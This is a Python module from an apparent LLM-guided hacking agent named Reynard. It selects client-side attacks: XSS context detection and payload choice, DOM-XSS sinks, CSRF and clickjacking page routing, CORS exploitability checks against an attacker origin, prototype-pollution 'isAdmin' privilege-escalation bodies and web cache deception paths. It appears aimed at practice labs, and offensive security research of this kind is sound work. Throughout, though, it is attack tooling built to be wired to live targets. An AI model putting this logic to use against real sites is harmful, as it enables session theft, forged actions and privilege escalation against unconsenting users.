"""
=============================================================================
Reynard — Client-side family deterministic routines
=============================================================================
Reusable, side-effect-free building blocks for the CLIENT-SIDE attack family
(XSS in every context/sink/filter, DOM-based vulns, CSRF, CORS, clickjacking,
prototype pollution, web cache deception) so the exploitation fast-paths and
the guided-LLM path share one correct, unit-testable implementation instead of
re-deriving payload selection per lab.

Nothing here makes a network call. Everything is pure/deterministic: the
callers wire these routines to the live target via ``http_request`` /
``browser_*`` and to delivery via ``exploit_server``. The payload/page
*builders* live in :mod:`hacking_agent.core.exploit_primitives`; this module is
the *decision* layer that inspects reflected HTML / response headers and
selects the right primitive.

Contents:
  - XSS reflection-context detection (HTML / attribute / JS-string / template
    literal / URL / canonical), character-filter probing, and context->payload
    selection using the ``exploit_primitives.xss_*`` builders.
  - DOM sink detection + DOM-XSS payload selection.
  - CSRF defense-variant -> primitive routing.
  - CORS ACAO/ACAC reflection classification.
  - Clickjacking sub-variant -> primitive routing.
  - Prototype pollution source/gadget probes + reflection detection.
  - Web cache deception path-confusion variant builder.
=============================================================================
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from urllib.parse import urlparse

from hacking_agent.core import exploit_primitives as primitives
from hacking_agent.core.exploit_primitives import XSS_PROOF

# A unique, alphanumeric marker that survives every reflection context intact
# (no chars that could be HTML/JS-encoded) so we can locate the reflection and
# read the surrounding syntax to classify the context.
MARKER = "rEyNaRdXsS"

# The special characters whose reflection/encoding decides whether a breakout
# is possible from a given context.
SPECIALS = "<>\"'`"

# Reflection context identifiers.
CTX_NONE = "none"
CTX_HTML = "html"
CTX_ATTR = "attribute"              # value inside a quoted tag attribute
CTX_ATTR_UNQUOTED = "attribute_unquoted"
CTX_JS_STRING = "js_string"         # inside a '..' or ".." JS string literal
CTX_TEMPLATE_LITERAL = "template_literal"   # inside a `..` template literal
CTX_JS = "js"                       # raw JS (not inside a string)


@dataclass(frozen=True)
class ReflectionContext:
    """Where and how a marker is reflected in a response body."""
    context: str = CTX_NONE
    quote: str = ""            # delimiting quote for attr/js-string ('"' | "'" | '`')
    tag: str = ""              # enclosing tag name for attribute contexts
    attribute: str = ""        # enclosing attribute name for attribute contexts
    reflected: bool = True     # marker present at all
    details: str = ""

    @property
    def is_reflected(self) -> bool:
        return self.reflected and self.context != CTX_NONE


def xss_probe_marker() -> str:
    """Return the canonical detection marker to reflect into the target."""
    return MARKER


def xss_filter_probe(marker: str = MARKER, specials: str = SPECIALS) -> str:
    """A probe that follows the marker with the raw special chars.

    Send this into the parameter and pass the response to
    :func:`analyze_char_filtering` to learn which characters survive raw, which
    are HTML-encoded, and which are stripped.
    """
    return f"{marker}{specials}"


# ---------------------------------------------------------------------------
# Reflection-context detection
# ---------------------------------------------------------------------------

def _open_string_quote(fragment: str, quotes: str) -> str:
    """Return the quote char left open at the end of ``fragment`` (or "").

    Walks the fragment tracking string state so nested/escaped quotes do not
    confuse the classifier. ``quotes`` limits which delimiters count (HTML
    attributes only honor ``"`` and ``'``; JS also honors backticks).
    """
    state = ""
    i = 0
    n = len(fragment)
    while i < n:
        c = fragment[i]
        if state:
            if c == "\\" and state in ("'", '"', "`"):
                i += 2
                continue
            if c == state:
                state = ""
        elif c in quotes:
            state = c
        i += 1
    return state


def _enclosing_tag_name(tag_fragment: str) -> str:
    match = re.match(r"<\s*/?\s*([a-zA-Z][a-zA-Z0-9:-]*)", tag_fragment)
    return match.group(1).lower() if match else ""


def _enclosing_attribute_name(tag_fragment: str) -> str:
    """Best-effort: the attribute whose value is currently being written."""
    match = re.search(
        r'([a-zA-Z_:][a-zA-Z0-9_:.-]*)\s*=\s*(?:"[^"]*|\'[^\']*|[^\s>"\']*)$',
        tag_fragment,
    )
    return match.group(1).lower() if match else ""


def detect_reflection_context(html: str, marker: str = MARKER) -> ReflectionContext:
    """Classify where ``marker`` is reflected inside ``html``.

    Deterministic syntactic classifier used to pick the correct XSS breakout
    primitive. Recognizes HTML body context, quoted/unquoted tag-attribute
    context (with tag + attribute names), JS single/double-quoted string
    context, JS template-literal (backtick) context, and raw JS context.
    """
    html = html or ""
    idx = html.find(marker)
    if idx == -1:
        return ReflectionContext(context=CTX_NONE, reflected=False,
                                 details="marker not reflected")
    before = html[:idx]
    lowered = before.lower()

    # (1) Inside a <script> ... </script> block => JS context.
    open_script = lowered.rfind("<script")
    close_script = lowered.rfind("</script")
    if open_script != -1 and open_script > close_script:
        script_frag = before[open_script:]
        gt = script_frag.find(">")
        js_body = script_frag[gt + 1:] if gt != -1 else script_frag
        quote = _open_string_quote(js_body, "'\"`")
        if quote == "`":
            return ReflectionContext(context=CTX_TEMPLATE_LITERAL, quote="`",
                                     details="inside template literal in <script>")
        if quote in ("'", '"'):
            return ReflectionContext(context=CTX_JS_STRING, quote=quote,
                                     details=f"inside {quote}-quoted JS string")
        return ReflectionContext(context=CTX_JS,
                                 details="raw JS context in <script>")

    # (2) Inside a tag (attribute) => the last '<' is unmatched by a '>'.
    last_lt = before.rfind("<")
    last_gt = before.rfind(">")
    if last_lt != -1 and last_lt > last_gt:
        tag_frag = before[last_lt:]
        tag = _enclosing_tag_name(tag_frag)
        quote = _open_string_quote(tag_frag, "'\"")
        if quote:
            return ReflectionContext(
                context=CTX_ATTR, quote=quote, tag=tag,
                attribute=_enclosing_attribute_name(tag_frag),
                details=f"inside {quote}-quoted {tag} attribute",
            )
        return ReflectionContext(
            context=CTX_ATTR_UNQUOTED, tag=tag,
            attribute=_enclosing_attribute_name(tag_frag),
            details=f"inside unquoted {tag} attribute",
        )

    # (3) Otherwise HTML text/body context.
    return ReflectionContext(context=CTX_HTML, details="HTML body/text context")


def analyze_char_filtering(html: str, marker: str = MARKER,
                           specials: str = SPECIALS) -> dict[str, str]:
    """Classify each special char as ``raw`` / ``encoded`` / ``stripped``.

    Feed the response to :func:`xss_filter_probe` here. For each char we look
    just after the reflected marker: the literal char means it survived
    (``raw``), an HTML entity means it was ``encoded``, and neither means it was
    ``stripped``.
    """
    result: dict[str, str] = {}
    html = html or ""
    idx = html.find(marker)
    if idx == -1:
        return {c: "unknown" for c in specials}
    # The specials were sent contiguously after the marker, so they are
    # reflected (raw or entity-encoded) in the same order directly after it.
    # Consume the reflected run sequentially so trailing page markup (e.g. a
    # closing </div>) is never mistaken for a surviving raw character.
    tail = html[idx + len(marker):]
    entities = {
        "<": ("&lt;", "&#60;", "&#x3c;"),
        ">": ("&gt;", "&#62;", "&#x3e;"),
        '"': ("&quot;", "&#34;", "&#x22;"),
        "'": ("&#39;", "&#x27;", "&apos;"),
        "`": ("&#96;", "&#x60;", "&grave;"),
    }
    pos = 0
    lowered_tail = tail.lower()
    for c in specials:
        raw_hit = tail[pos:pos + 1] == c
        ent_hit = ""
        for ent in entities.get(c, ()):
            if lowered_tail[pos:pos + len(ent)] == ent.lower():
                ent_hit = ent
                break
        if raw_hit:
            result[c] = "raw"
            pos += 1
        elif ent_hit:
            result[c] = "encoded"
            pos += len(ent_hit)
        else:
            result[c] = "stripped"
    return result


def _blocked(filters: dict[str, str] | None, ch: str) -> bool:
    """True when a char is unavailable for a breakout (encoded or stripped)."""
    if not filters:
        return False
    return filters.get(ch) in ("encoded", "stripped")


# ---------------------------------------------------------------------------
# XSS payload selection (context -> primitive)
# ---------------------------------------------------------------------------

def select_xss_payload(
    ctx: ReflectionContext,
    *,
    js: str = XSS_PROOF,
    filters: dict[str, str] | None = None,
    svg_only: bool = False,
    canonical: bool = False,
    tags_blocked: bool = False,
    js_escapes_quote: bool = False,
) -> tuple[str, str]:
    """Pick the correct ``exploit_primitives.xss_*`` payload for ``ctx``.

    Returns ``(technique_name, payload)``. ``filters`` is the
    :func:`analyze_char_filtering` map (used to decide breakouts). The keyword
    flags cover lab sub-variants that syntax alone cannot reveal: ``svg_only``
    (only SVG tags/attrs allowed), ``canonical`` (reflected into a canonical
    ``<link>``), ``tags_blocked`` (angle brackets/known tags filtered so an
    attribute breakout / custom form is needed), and ``js_escapes_quote`` (the
    app backslash-escapes quotes in a JS string).
    """
    context = ctx.context if isinstance(ctx, ReflectionContext) else str(ctx)

    if canonical:
        return "canonical_link", primitives.xss_canonical_link(js)

    if context == CTX_HTML:
        if svg_only:
            return "svg_onload", primitives.xss_svg_onload(js)
        if tags_blocked or _blocked(filters, "<"):
            # Angle brackets survive as text but <script> is stripped -> use a
            # body/svg event handler (custom-tag labs prefer <svg>/<xss>).
            return "svg_onload", primitives.xss_svg_onload(js)
        return "html_script", primitives.xss_html_context(js)

    if context == CTX_ATTR:
        quote = ctx.quote or '"'
        if not _blocked(filters, "<") and not _blocked(filters, ">"):
            # Can break out of the attribute and the tag entirely.
            return "attr_tag_breakout", primitives.xss_attribute_tag_breakout(js, quote=quote)
        # Angle brackets encoded -> stay inside the tag: add an event handler.
        return "attr_autofocus", primitives.xss_attribute_autofocus(js, quote=quote)

    if context == CTX_ATTR_UNQUOTED:
        # No quote to close; inject a space + event handler (+ autofocus).
        return "attr_event", primitives.xss_attribute_event(js, quote="", event="onmouseover")

    if context == CTX_JS_STRING:
        quote = ctx.quote or "'"
        if js_escapes_quote:
            return "js_string_backslash", primitives.xss_js_string_backslash(js)
        return "js_string_breakout", primitives.xss_js_string_breakout(js, quote=quote)

    if context == CTX_TEMPLATE_LITERAL:
        return "template_literal", primitives.xss_template_literal(js)

    if context == CTX_JS:
        if not _blocked(filters, "<"):
            return "js_script_close", primitives.xss_script_close(js)
        return "js_raw", js

    # Unknown / not reflected: fall back to a plain HTML script payload so the
    # guided-LLM path still has a sane starting point.
    return "html_script", primitives.xss_html_context(js)


# ---------------------------------------------------------------------------
# DOM-based XSS: sink detection + payload selection
# ---------------------------------------------------------------------------

# sink keyword -> (technique, payload builder). Ordered by specificity.
_DOM_SINKS: list[tuple[tuple[str, ...], str]] = [
    (("document.write", "document.writeln"), "document_write"),
    (("innerhtml", "outerhtml", "insertadjacenthtml"), "innerhtml"),
    (("$(", "jquery", "attr('href'", 'attr("href"'), "jquery_href"),
    (("eval(", "settimeout", "setinterval", "function("), "js_eval"),
    (("location", "location.href", "src", "href"), "js_url"),
]


def detect_dom_sink(script_text: str) -> str:
    """Best-effort classify the DOM sink from page JS. Returns a sink label."""
    text = (script_text or "").lower()
    if "location.hash" in text and ("$(" in text or "jquery" in text):
        return "jquery_selector"
    for needles, label in _DOM_SINKS:
        if any(n in text for n in needles):
            return label
    return ""


def select_dom_payload(sink: str, *, js: str = XSS_PROOF) -> tuple[str, str]:
    """Pick a DOM-XSS payload string for a detected sink label."""
    sink = (sink or "").lower()
    if sink in ("document_write", "document.write"):
        return "dom_document_write", primitives.dom_document_write_payload(js)
    if sink in ("innerhtml", "insertadjacenthtml", "outerhtml"):
        return "dom_innerhtml", primitives.dom_innerhtml_payload(js)
    if sink in ("jquery_href", "js_url", "href", "src", "location"):
        return "dom_jquery_href", primitives.dom_jquery_href_payload(js)
    if sink in ("jquery_selector", "selector"):
        return "dom_jquery_selector", primitives.dom_jquery_selector_payload(js)
    # Default: an innerHTML-style img/onerror works in most string-to-HTML sinks.
    return "dom_innerhtml", primitives.dom_innerhtml_payload(js)


# ---------------------------------------------------------------------------
# CSRF: defense-variant -> primitive routing
# ---------------------------------------------------------------------------

def select_csrf_page(
    subvariant: str,
    action: str,
    fields: dict[str, str],
    *,
    method: str = "POST",
    token_field: str = "csrf",
    token_value: str = "",
    cookie_setter_url: str = "",
    email_field: str = "email",
    email_value: str = "",
    get_query: str = "",
):
    """Route a CSRF sub-variant to the correct ``exploit_primitives`` builder.

    Returns an ``ExploitPage``. Covers: no-defenses / token-not-present /
    token-not-tied-to-session / token-tied-to-non-session-cookie
    (double-submit), method-dependent validation, SameSite Lax/Strict bypass,
    and Referer-validation bypass.
    """
    text = (subvariant or "").lower().replace("_", " ").replace("-", " ")

    # Double-submit cookie: the token only has to match a cookie the attacker
    # can plant cross-site.
    if cookie_setter_url and ("cookie" in text or "double submit" in text
                              or "duplicated" in text):
        return primitives.csrf_double_submit(
            action, email_field=email_field, csrf_field=token_field,
            token=token_value or "ReynardForgedCsrf01",
            cookie_setter_url=cookie_setter_url, email_value=email_value,
            method=method,
        )

    # Method-dependent validation: the token is only checked on POST, so send
    # the change as a GET.
    if "method" in text:
        if get_query:
            return primitives.csrf_samesite_get(action, get_query)
        return primitives.csrf_get_image(action, get_query)

    # Referer-based validation -> suppress the Referer header.
    if "referer" in text or "referrer" in text:
        return primitives.csrf_referrer_suppressed(action, fields, method=method)

    # SameSite Strict/Lax: top-level navigation carries the cookie.
    if "samesite" in text or "same site" in text:
        if "strict" in text or method.upper() == "GET":
            if get_query:
                return primitives.csrf_samesite_get(action, get_query)
        return primitives.csrf_samesite_lax_form(action, fields)

    # Default (no defenses / token not present / token not tied to session):
    # a plain auto-submitting form with the attacker's (or reused) token.
    return primitives.csrf_autosubmit_form(action, fields, method=method)


# ---------------------------------------------------------------------------
# CORS: ACAO / ACAC reflection classification
# ---------------------------------------------------------------------------

CORS_REFLECTED = "origin_reflected"
CORS_NULL = "null_origin"
CORS_WILDCARD = "wildcard"
CORS_NONE = "none"


def _header_value(headers: str | dict, name: str) -> str:
    name_l = name.lower()
    if isinstance(headers, dict):
        for k, v in headers.items():
            if k.lower() == name_l:
                return str(v)
        return ""
    # raw header text
    match = re.search(rf"(?im)^{re.escape(name)}\s*:\s*(.+?)\s*$", headers or "")
    return match.group(1).strip() if match else ""


def detect_cors_reflection(headers: str | dict, probe_origin: str) -> dict:
    """Classify a CORS response's trust of a cross-origin ``probe_origin``.

    ``headers`` may be a raw header block or a dict. Returns a dict with
    ``kind`` (one of the ``CORS_*`` constants), ``credentials`` (whether
    ``Access-Control-Allow-Credentials: true`` is present), and the raw ACAO
    value. Origin-reflection or trusted-null with credentials is exploitable.
    """
    acao = _header_value(headers, "Access-Control-Allow-Origin")
    acac = _header_value(headers, "Access-Control-Allow-Credentials")
    credentials = acac.strip().lower() == "true"
    origin_l = (probe_origin or "").strip().rstrip("/").lower()
    acao_l = acao.strip().rstrip("/").lower()

    if acao_l == "*":
        kind = CORS_WILDCARD
    elif acao_l == "null":
        kind = CORS_NULL
    elif origin_l and acao_l == origin_l:
        kind = CORS_REFLECTED
    else:
        kind = CORS_NONE

    return {
        "kind": kind,
        "credentials": credentials,
        "acao": acao,
        "exploitable": kind in (CORS_REFLECTED, CORS_NULL) and credentials,
    }


def cors_probe_origins(base_url: str = "", attacker_origin: str = "https://exploit.reynard.net") -> list[str]:
    """Origins to try against a CORS endpoint: attacker, null, and sub-abuse.

    Includes an attacker origin (basic reflection), ``null`` (sandbox/redirect),
    and an ``http://`` insecure-protocol subdomain form some apps trust.
    """
    origins = [attacker_origin, "null"]
    host = urlparse(base_url).hostname if base_url else ""
    if host:
        origins.append(f"http://subdomain.{host}")
        origins.append(f"https://{host}.{urlparse(attacker_origin).hostname or 'evil.net'}")
    return origins


# ---------------------------------------------------------------------------
# Clickjacking: sub-variant -> primitive routing
# ---------------------------------------------------------------------------

def select_clickjacking_page(
    subvariant: str,
    target_url: str,
    *,
    decoy_text: str = "Click me",
    prefill_query: str = "",
    domxss_url: str = "",
    decoys=None,
):
    """Route a clickjacking sub-variant to the right overlay builder.

    Covers: basic (with CSRF token), pre-filled-from-URL, ->DOM-XSS, and
    multistep. Frame-buster labs use the same overlay (the buster is defeated
    by the sandboxed iframe the caller stores), so they route to the basic
    frame.
    """
    text = (subvariant or "").lower().replace("_", " ").replace("-", " ")

    if decoys:
        return primitives.clickjacking_multistep(target_url, decoys)
    if "multistep" in text or "multi step" in text or "multiple" in text:
        # Caller did not supply decoys; fall back to two stacked decoys.
        return primitives.clickjacking_multistep(
            target_url,
            [{"text": decoy_text, "top": 300, "left": 60},
             {"text": decoy_text, "top": 360, "left": 60}],
        )
    if domxss_url or "dom" in text or "xss" in text:
        return primitives.clickjacking_to_domxss(domxss_url or target_url,
                                                 decoy_text=decoy_text)
    if prefill_query or "prefill" in text or "form input" in text or "url" in text:
        return primitives.clickjacking_prefilled(
            target_url, query=prefill_query, decoy_text=decoy_text)
    return primitives.clickjacking_frame(target_url, decoy_text=decoy_text)


# ---------------------------------------------------------------------------
# Prototype pollution: source/gadget probes + reflection detection
# ---------------------------------------------------------------------------

PP_PROBE_PROP = "reynardpp"
PP_PROBE_VALUE = "polluted"


def pp_client_source_probes(base_url: str = "") -> list[str]:
    """Client-side PP source probes (bracket, dot, constructor notations)."""
    return primitives.prototype_pollution_probes(base_url)


def pp_detection_script(prop: str = PP_PROBE_PROP) -> str:
    """JS to run in the browser to read a polluted ``Object.prototype`` prop.

    Returns the value of ``Object.prototype[prop]`` (or ``({})[prop]``); a
    non-null result confirms the pollution source landed.
    """
    return f"return ({{}}).{prop} || Object.prototype.{prop} || null;"


def pp_server_probes(prop: str = PP_PROBE_PROP, value: object = PP_PROBE_VALUE) -> list[str]:
    """Server-side PP JSON bodies: ``__proto__`` and ``constructor.prototype``."""
    return [
        primitives.prototype_pollution_json(prop, value),
        primitives.prototype_pollution_constructor_json(prop, value),
    ]


def pp_privilege_escalation_bodies(prop: str = "isAdmin") -> list[str]:
    """Server-side PP privilege-escalation bodies (``isAdmin`` gadget)."""
    return [
        primitives.prototype_pollution_json(prop, True),
        primitives.prototype_pollution_constructor_json(prop, True),
    ]


def detect_prototype_pollution(prop_value: object) -> bool:
    """True when a PP detection probe returned the injected value."""
    if prop_value is None:
        return False
    return str(prop_value).lower() in ("polluted", "true", "1", PP_PROBE_VALUE)


def pp_client_gadget_payloads(base_url: str = "", *, js: str = XSS_PROOF) -> list[tuple[str, str]]:
    """Client PP -> DOM-XSS gadget source URLs (property + value combos).

    Returns ``(gadget_name, source_url_fragment)`` for each known script-gadget
    so the caller can pollute the property and then trigger the sink.
    """
    out: list[tuple[str, str]] = []
    for name, (prop, value) in primitives.CLIENT_PP_GADGETS.items():
        out.append((name, primitives.prototype_pollution_url(
            prop, value, base_url=base_url)))
    return out


# ---------------------------------------------------------------------------
# Web cache deception: path-confusion variant builder
# ---------------------------------------------------------------------------

# Static-looking suffixes / delimiters that a CDN caches but the origin ignores.
_WCD_STATIC_EXTS = (".js", ".css", ".jpg", ".png", ".ico", ".svg", ".txt")
_WCD_DELIMITERS = (";", "%3b", "%00", "%0a", "#", "?")


def web_cache_deception_paths(sensitive_path: str = "/my-account",
                              static_dir: str = "/resources") -> list[tuple[str, str]]:
    """Ordered path-confusion variants for web cache deception.

    Returns ``(variant_name, path)`` covering static-extension append,
    delimiter-based origin-server normalization, encoded-dot-segment, and
    static-directory path traversal. The caller requests each, then fetches the
    same URL unauthenticated (or as another user) to confirm the sensitive
    response was cached.
    """
    base = "/" + sensitive_path.strip("/")
    variants: list[tuple[str, str]] = []
    # 1) Append a cached static extension (classic ".../wcd.css").
    variants.append(("static_ext_append", f"{base}/reynardwcd.js"))
    variants.append(("static_ext_css", f"{base}/reynardwcd.css"))
    # 2) Delimiter path confusion (origin ignores after ';', CDN keys full path).
    for delim in (";", "%3b"):
        variants.append((f"delimiter_{delim}", f"{base}{delim}reynardwcd.js"))
    # 3) Encoded newline / dot-segment normalization.
    variants.append(("encoded_dot_segment", f"{base}%2f%2e%2e%2f{static_dir.strip('/')}/reynardwcd.js"))
    # 4) Static-directory traversal back to the sensitive endpoint.
    variants.append((
        "static_dir_traversal",
        f"{static_dir.rstrip('/')}/%2e%2e{base}",
    ))
    return variants


def looks_cached(headers: str | dict) -> bool:
    """True when response headers indicate a cache hit / cacheable response."""
    cache_status = _header_value(headers, "X-Cache").lower()
    cache_control = _header_value(headers, "Cache-Control").lower()
    age = _header_value(headers, "Age")
    if "hit" in cache_status:
        return True
    if age and age.strip().isdigit() and int(age.strip()) > 0:
        return True
    if "public" in cache_control and "no-store" not in cache_control:
        return True
    return False
